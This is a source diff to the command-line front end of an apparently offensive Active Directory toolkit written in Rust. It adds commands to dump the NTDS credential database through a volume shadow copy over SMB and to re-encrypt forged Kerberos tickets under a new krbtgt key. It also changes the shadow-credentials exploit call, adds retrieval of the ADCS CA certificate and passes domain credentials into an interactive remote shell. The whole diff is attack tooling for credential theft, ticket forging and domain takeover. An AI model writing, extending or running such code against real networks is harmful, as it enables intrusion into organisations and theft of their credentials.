@@ -112,6 +112,12 @@ pub async fn cmd_dump(cli: &Cli, target: &str, source: DumpSource, user: Option<
                 desc,
             )
         }
+        DumpSource::NtdsVss => (
+            overthrone_pilot::planner::PlannedAction::DumpNtds {
+                target: target.to_string(),
+            },
+            format!("NTDS via VSS+SMB @GMT shadow copy from {}", target),
+        ),
         DumpSource::Dcc2 => (
             overthrone_pilot::planner::PlannedAction::DumpDcc2 {
                 target: target.to_string(),
@@ -964,6 +970,49 @@ pub async fn cmd_module_run_parallel(
 // ----------------------------------------------
 
 #[cfg(feature = "forge")]
+/// Rotate ticket encryption under a new krbtgt key -- purely local operation, no DC needed.
+async fn cmd_forge_rotate_ticket(
+    cli: &Cli,
+    input: &str,
+    old_key: &str,
+    new_key: &str,
+    output: &str,
+) -> i32 {
+    use overthrone_forge::rotate;
+    let input_bytes = match tokio::fs::read(input).await {
+        Ok(b) => b,
+        Err(e) => {
+            banner::print_fail(&format!("Cannot read input file {input}: {e}"));
+            return 1;
+        }
+    };
+    let rotated = match rotate::rotate_ticket_encryption(&input_bytes, old_key, new_key) {
+        Ok(r) => r,
+        Err(e) => {
+            banner::print_fail(&format!("Ticket rotation failed: {e}"));
+            return 1;
+        }
+    };
+    let output_path = if output.is_empty() { "rotated.kirbi" } else { output };
+    if let Err(e) = tokio::fs::write(output_path, &rotated.kirbi).await {
+        banner::print_fail(&format!("Cannot write {output_path}: {e}"));
+        return 1;
+    }
+    banner::print_success(&format!(
+        "Ticket rotated: {} -> {} (old: {}, new: {}, {} bytes)",
+        input,
+        output_path,
+        rotated.old_etype,
+        rotated.new_etype,
+        rotated.kirbi.len()
+    ));
+    if let Some(path) = &cli.outfile {
+        let _ = tokio::fs::write(path, &rotated.kirbi).await;
+    }
+    0
+}
+
+#[cfg(feature = "forge")]
 /// Convert a ticket format (kirbi/ccache/base64) -- purely local operation, no DC needed.
 async fn cmd_forge_convert_ticket(cli: &Cli, input: &str, format: &str) -> i32 {
     use overthrone_forge::convert;
@@ -1021,13 +1070,17 @@ pub async fn cmd_forge(cli: &Cli, action: &ForgeAction) -> i32 {
 
     // Some forge operations are purely local (no DC needed).
     // Handle those first before requiring domain/DC.
-    if matches!(action, ForgeAction::ConvertTicket { .. }) {
-        return match action {
-            ForgeAction::ConvertTicket { input, format } => {
-                cmd_forge_convert_ticket(cli, input, format).await
-            }
-            _ => unreachable!(),
-        };
+    if let ForgeAction::ConvertTicket { input, format } = action {
+        return cmd_forge_convert_ticket(cli, input, format).await;
+    }
+    if let ForgeAction::RotateTicket {
+        input,
+        old_key,
+        new_key,
+        output,
+    } = action
+    {
+        return cmd_forge_rotate_ticket(cli, input, old_key, new_key, output).await;
     }
 
     let domain = match crate::require_dc_only_creds(cli) {
@@ -1365,6 +1418,23 @@ fn build_runner_action(
             RunnerForgeAction::ConvertTicket {
                 input_path: input.clone(),
                 output_format: format.clone(),
+            }
+        }
+        ForgeAction::RotateTicket {
+            input,
+            old_key,
+            new_key,
+            output,
+        } => {
+            opts.insert("input".to_string(), input.clone());
+            opts.insert("old_key".to_string(), old_key.clone());
+            opts.insert("new_key".to_string(), new_key.clone());
+            opts.insert("output".to_string(), output.clone());
+            RunnerForgeAction::RotateTicket {
+                input_path: input.clone(),
+                old_key: old_key.clone(),
+                new_key: new_key.clone(),
+                output_path: output.clone(),
             }
         }
         ForgeAction::AsRepToTgt {
@@ -2861,8 +2931,8 @@ pub async fn cmd_shadow_cred(cli: &Cli, action: &ShadowCredAction) -> i32 {
             println!(" {} Key size: {} bits", ">".bright_black(), key_size);
             println!(" {} Validity: {} hours", ">".bright_black(), validity_hours);
 
-            match overthrone_core::postex::cves::exploit_shadow_credentials(
-                &mut ldap, &dc, &domain, &target_dn,
+            match overthrone_core::postex::cves::try_exploit_shadow_credentials(
+                &mut ldap, &dc, &domain, &target_dn, target,
             )
             .await
             {
@@ -5110,6 +5180,71 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
                 }
             }
         }
+        AdcsAction::GetCaCert { output } => {
+            println!(" {} Retrieving CA certificate via LDAP...", ">".bright_black());
+
+            let creds = match crate::require_creds(cli) {
+                Ok(c) => c,
+                Err(e) => return e,
+            };
+            let dc = match crate::require_dc(cli) {
+                Ok(d) => d,
+                Err(e) => return e,
+            };
+
+            let password = creds.password().unwrap_or("");
+            match overthrone_forge::ms_wcce_dcom::get_ca_certificate_via_ldap(
+                &dc, &creds.domain, &creds.username, password,
+            )
+            .await
+            {
+                Ok(cert_der) => {
+                    if let Err(e) = tokio::fs::write(output, &cert_der).await {
+                        banner::print_fail(&format!("Failed to write CA certificate: {}", e));
+                        return 1;
+                    }
+                    println!(" {} CA certificate obtained ({} bytes)", "[+]".green(), cert_der.len());
+                    println!(" Saved to: {}", output.cyan());
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("CA certificate retrieval failed: {}", e));
+                    return 1;
+                }
+            }
+        }
+        AdcsAction::BackupCa { output } => {
+            println!(" {} Retrieving CA certificate via LDAP (backup)...", ">".bright_black());
+            println!(" {} Note: backup-ca retrieves the CA certificate. The private key requires local CA access.", " [!]".yellow());
+
+            let creds = match crate::require_creds(cli) {
+                Ok(c) => c,
+                Err(e) => return e,
+            };
+            let dc = match crate::require_dc(cli) {
+                Ok(d) => d,
+                Err(e) => return e,
+            };
+
+            let password = creds.password().unwrap_or("");
+            match overthrone_forge::ms_wcce_dcom::get_ca_certificate_via_ldap(
+                &dc, &creds.domain, &creds.username, password,
+            )
+            .await
+            {
+                Ok(cert_der) => {
+                    if let Err(e) = tokio::fs::write(output, &cert_der).await {
+                        banner::print_fail(&format!("Failed to write CA backup: {}", e));
+                        return 1;
+                    }
+                    println!(" {} CA certificate backed up ({} bytes)", "[+]".green(), cert_der.len());
+                    println!(" Saved to: {}", output.cyan());
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("CA backup failed: {}", e));
+                    return 1;
+                }
+            }
+        }
     }
 
     banner::print_success("ADCS operation completed");
@@ -5120,15 +5255,33 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
 // cmd_shell -- Interactive Shell
 // ----------------------------------------------
 
-pub async fn cmd_shell(target: &str, shell_type: &ShellType) -> i32 {
+pub async fn cmd_shell(cli: &Cli, target: &str, shell_type: &ShellType) -> i32 {
     banner::print_module_banner("SHELL");
     println!(" {} Starting interactive shell session", ">".bright_black());
     println!(" {} Target: {}", ">".bright_black(), target.cyan());
     println!(" {} Type: {:?}", ">".bright_black(), shell_type);
     println!();
 
-    // Use the new interactive shell implementation with target
-    match crate::interactive_shell::start_interactive_shell_with_target(target, shell_type).await {
+    // Resolve optional credentials from CLI flags
+    let (domain, username, password) = match crate::require_creds_silent(cli) {
+        Ok(creds) => (
+            Some(creds.domain.clone()),
+            Some(creds.username.clone()),
+            creds.password().map(|s| s.to_string()),
+        ),
+        Err(_) => (None, None, None),
+    };
+
+    // Use the new interactive shell implementation with target and optional credentials
+    match crate::interactive_shell::start_interactive_shell_with_creds(
+        target,
+        shell_type,
+        domain,
+        username,
+        password,
+    )
+    .await
+    {
         Ok(()) => {
             banner::print_success("Interactive shell session completed");
             0
